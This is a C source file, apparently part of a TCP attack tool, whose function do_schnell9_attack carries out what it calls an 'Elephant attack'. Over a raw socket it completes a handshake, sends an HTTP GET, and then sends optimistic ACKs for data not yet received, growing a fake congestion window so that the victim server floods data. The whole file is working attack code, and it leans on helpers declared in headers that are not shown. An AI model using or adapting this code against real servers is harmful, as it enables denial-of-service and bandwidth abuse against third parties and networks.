#include <stdlib.h>
#include <netdb.h>
#include <arpa/inet.h>
#include <string.h>
#include <assert.h>
#include <unistd.h>
#include <pthread.h>
#include <time.h>
#include <sys/types.h>
#include <pcap.h>
#include <netinet/tcp.h>
#include <sched.h>
#include <sys/time.h>
#include <sys/resource.h>
#include <signal.h>

#include "schnell.h"
#include "utils.h"

int sendRealHTMLGet(int);
unsigned int countbytes(int,int);

int do_schnell9_attack(int rawSock){
	int startSeq;
	struct timespec sleepTime;
	int slowstart;
	int oecwnd;
	int ecwnd;
	int i;
	unsigned int MaxWindow = 65536;
	int retries=0;

	do {
		sendSYN(rawSock);
		retries++;
	} while( getSYNACK(rawSock) && (retries < 10));

        if(retries>=10){
		fprintf(stderr,"Never Got SYNACK :(\n");
		exit(1);
	}
        victimSequence++;
	localSequence++;
	sendACK(rawSock);
	// send request
        sendHTMLGET(rawSock);   // send "GET URL\r\n" to server
	sleepTime.tv_sec=0;
	sleepTime.tv_nsec = usRTT*1000;
	ecwnd = 2*MSS;
	startSeq=victimSequence;
	Window=65534;
	printf("Doing Elephant attack rtt=%ld\n",usRTT);

	slowstart=1;
	while(countbytes(victimSequence,startSeq)<FileSize){
		nanosleep(&sleepTime,NULL);
		if(slowstart){
			oecwnd=ecwnd;
			for(i=0;i<(oecwnd/MSS);i++){
				victimSequence+=MSS;
				sendACK(rawSock);
				ecwnd+=MSS;
			}
			if(ecwnd>MaxWindow){
				ecwnd=MaxWindow;
				slowstart=0;
				Window=65535;
			}
		} else {	// congestion avoidance
			victimSequence+=ecwnd/2;
			sendACK(rawSock);
		}
	}
				
	return 0;
}
